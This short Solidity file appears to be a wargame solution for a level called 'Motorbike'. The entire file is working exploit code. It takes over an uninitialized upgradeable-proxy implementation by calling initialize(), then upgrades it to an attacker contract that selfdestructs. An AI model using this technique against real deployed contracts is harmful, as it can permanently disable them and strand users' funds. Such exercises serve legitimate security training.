// SPDX-License-Identifier: MIT
// 0x06eFB89Eb822e09A3fAe04e158eA730982282753

pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
}

contract HackMotorbike {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.kill.selector)
        );
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}